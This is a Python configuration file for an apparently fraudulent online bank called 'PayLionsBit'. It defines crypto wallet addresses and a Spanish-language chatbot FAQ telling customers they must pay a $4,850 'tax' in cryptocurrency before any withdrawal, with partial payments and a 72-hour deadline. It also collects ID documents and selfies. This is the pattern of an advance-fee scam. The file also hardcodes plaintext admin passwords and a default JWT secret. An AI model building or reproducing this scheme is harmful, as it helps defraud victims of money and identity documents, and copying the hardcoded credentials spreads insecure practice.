"""Shared configuration, database connection, and constants."""
import os
import json
import logging
from pathlib import Path
from datetime import datetime, timezone
from motor.motor_asyncio import AsyncIOMotorClient
from fastapi.responses import JSONResponse
from bson import ObjectId
from dotenv import load_dotenv

ROOT_DIR = Path(__file__).parent
load_dotenv(ROOT_DIR / '.env')

# Logging
logging.basicConfig(level=logging.INFO)

# Email Configuration
RESEND_API_KEY = os.environ.get('RESEND_API_KEY', '')
SENDER_EMAIL = os.environ.get('SENDER_EMAIL', 'noreply@paylionsbit.es')
ADMIN_EMAIL = os.environ.get('ADMIN_EMAIL', 'info@paylionsbit.es')

# ═══════════════════════════════════════════════════════════════════
#  CORPORATE BRANDING — single source of truth for user-facing info
# ═══════════════════════════════════════════════════════════════════
# Override any of these via environment variables in production
# without touching the codebase.
SUPPORT_EMAIL    = os.environ.get('SUPPORT_EMAIL',    'info@paylionsbit.es')
SUPPORT_PHONE    = os.environ.get('SUPPORT_PHONE',    '+447400757168')
SUPPORT_WHATSAPP = os.environ.get('SUPPORT_WHATSAPP', 'https://wa.me/447400757168')
COMPANY_NAME     = os.environ.get('COMPANY_NAME',     'PayLionsBit')
COMPANY_WEBSITE  = os.environ.get('COMPANY_WEBSITE',  'https://paylionsbit.es')

BRANDING = {
    'support_email':    SUPPORT_EMAIL,
    'support_phone':    SUPPORT_PHONE,
    'support_whatsapp': SUPPORT_WHATSAPP,
    'company_name':     COMPANY_NAME,
    'company_website':  COMPANY_WEBSITE,
}

# JWT Configuration
JWT_SECRET = os.environ.get('JWT_SECRET', 'super-secret-banking-key-change-in-production')
JWT_ALGORITHM = 'HS256'
JWT_EXPIRATION_HOURS = 24

# Exchange rates
EXCHANGE_RATES = {'USD': 1.0, 'EUR': 0.92}

# Constants
DAILY_TRANSFER_LIMIT_EUR = 10000
UNVERIFIED_TRANSFER_LIMIT_EUR = 1000
TAX_AMOUNT = 4850.0
MIN_TAX_PAYMENT = 1000.0
SUGGESTED_TAX_EUR = 2668.0
GOVERNMENT_TREASURY_ID = "GOVT-TREASURY-001"
FRAUD_THRESHOLD_AMOUNT = 5000
FRAUD_THRESHOLD_COUNT = 3
FRAUD_THRESHOLD_MINUTES = 5

# Admin accounts
ADMIN_ACCOUNTS = [
    {'name': 'Admin LionsBit', 'email': 'admi@paylionsbit.es', 'password': 'LionsBit2026!'},
    {'name': 'Admin Backup', 'email': 'admin.backup@paylionsbit.es', 'password': 'LionsBit2026!Backup'},
]

# Bank transfer restriction (whitelist-style: emails here are BLOCKED from seeing bank transfer methods)
RESTRICTED_BANK_TRANSFER_EMAILS = []

# App base URL
APP_BASE_URL = os.environ.get('APP_BASE_URL', 'https://paylionsbit.es')

# Support emails (legacy aliases — prefer BRANDING['support_email'])
SUPPORT_EMAILS = ['info@lionbit.es', SUPPORT_EMAIL]

# Corporate Crypto Wallets (Fixed addresses for tax payments)
CRYPTO_WALLETS = {
    'BTC': {
        'address': '1D8qYgB782ASjwDPwJAafuoTx2TFKFyM89',
        'network': 'Bitcoin',
        'name': 'Bitcoin',
        'icon': 'bitcoin',
    },
    'BTC_LEGACY': {
        'address': '1HXRaffo3SeLBjfD9Du12y8qE9Pod9m2uW',
        'network': 'Bitcoin (Legacy)',
        'name': 'Bitcoin (SafePal)',
        'icon': 'bitcoin',
    },
    'ETH': {
        'address': '0x3ab1d3202a3cd4541093601a16ae3770d33c9f28',
        'network': 'Ethereum (ERC20)',
        'name': 'Ethereum',
        'icon': 'ethereum',
    },
    'BNB': {
        'address': '0x3ab1d3202a3cd4541093601a16ae3770d33c9f28',
        'network': 'BNB Smart Chain (BEP20)',
        'name': 'BNB',
        'icon': 'bnb',
    },
    'USDT': {
        'address': 'TWsDmdfRX2aXmx8ndQy1ijwmDTXJs6NW6p',
        'network': 'Tron (TRC20)',
        'name': 'Tether USDT',
        'icon': 'usdt',
    },
}

# Chatbot FAQ
CHATBOT_FAQ = {
    'retiro': {
        'keywords': ['retiro', 'retirar', 'withdraw', 'sacar', 'dinero', 'fondos'],
        'answer': 'Para solicitar un retiro: 1) Ve a la seccion Withdraw en el menu lateral. 2) Selecciona la cuenta y el monto. 3) Se genera un impuesto obligatorio de $4,850 USD. 4) Paga el impuesto en criptomonedas (pagos parciales minimo $200 USD). 5) El administrador revisara y aprobara tu retiro.'
    },
    'impuesto': {
        'keywords': ['impuesto', 'tax', 'por que pagar', 'pagar impuesto', '4850', '4,850'],
        'answer': 'El impuesto de $4,850 USD es un requisito obligatorio de cumplimiento fiscal para procesar retiros. Debe ser pagado en criptomonedas. Puede realizar pagos parciales con un minimo de $200 USD por pago.'
    },
    'tiempo': {
        'keywords': ['cuanto tarda', 'tiempo', 'demora', 'cuanto tiempo', 'plazo', 'esperar'],
        'answer': 'Tiempos de procesamiento: Pago de impuesto: 72 horas maximo. Revision admin: 24-48 horas despues del pago completo. Procesamiento: 1-3 dias habiles despues de aprobacion. Si no se completa el pago del impuesto en 72 horas, el retiro se rechaza automaticamente.'
    },
    'minimo': {
        'keywords': ['minimo', 'pago parcial', 'abono', 'parcial', '200'],
        'answer': 'El pago minimo por cada abono al impuesto es de $200 USD. Puede realizar multiples pagos parciales hasta completar los $4,850 USD. Todos los pagos deben realizarse en criptomonedas.'
    },
    'verificacion': {
        'keywords': ['verificar', 'verificacion', 'kyc', 'identidad', 'documento', 'selfie'],
        'answer': 'Para verificar su cuenta (KYC): 1) Vaya a Verification en el menu. 2) Suba la foto frontal del documento. 3) Suba la foto trasera. 4) Tome una selfie sosteniendo su documento. 5) Escriba su nombre legal como firma digital. 6) Acepte los terminos y envie. Revision: 24-48 horas.'
    },
    'soporte': {
        'keywords': ['soporte', 'ayuda', 'contactar', 'problema', 'ticket', 'telefono', 'whatsapp', 'llamar', 'numero'],
        'answer': f'Puede contactarnos por estos medios:\n\n1) **WhatsApp/Telefono:** {SUPPORT_PHONE}\n2) **Ticket de soporte:** Cree uno desde este chat o en la seccion Support del menu\n3) **Email:** {SUPPORT_EMAIL}\n\nNuestro equipo respondera lo antes posible.'
    }
}

# MongoDB connection
mongo_url = os.environ['MONGO_URL']
client = AsyncIOMotorClient(mongo_url)
db_name = os.environ.get('DB_NAME')
if not db_name:
    from urllib.parse import urlparse
    parsed = urlparse(mongo_url)
    db_name = parsed.path.strip('/') if parsed.path and parsed.path != '/' else 'lionsbit_bank'
db = client[db_name]

# Custom JSON handling for MongoDB
class MongoJSONEncoder(json.JSONEncoder):
    def default(self, o):
        if isinstance(o, ObjectId):
            return str(o)
        if isinstance(o, datetime):
            return o.isoformat()
        return super().default(o)

def sanitize_mongo_doc(obj):
    """Recursively remove _id and convert ObjectId to str"""
    if isinstance(obj, dict):
        return {k: sanitize_mongo_doc(v) for k, v in obj.items() if k != '_id'}
    if isinstance(obj, list):
        return [sanitize_mongo_doc(item) for item in obj]
    if isinstance(obj, ObjectId):
        return str(obj)
    return obj

class SafeJSONResponse(JSONResponse):
    """JSONResponse that auto-sanitizes MongoDB ObjectId and _id fields"""
    def render(self, content) -> bytes:
        clean = sanitize_mongo_doc(content)
        return json.dumps(clean, cls=MongoJSONEncoder, ensure_ascii=False).encode("utf-8")

def strip_id(doc):
    if doc is None:
        return None
    if isinstance(doc, dict):
        return {k: sanitize_mongo_doc(v) for k, v in doc.items() if k != '_id'}
    if isinstance(doc, list):
        return [strip_id(d) for d in doc]
    return doc
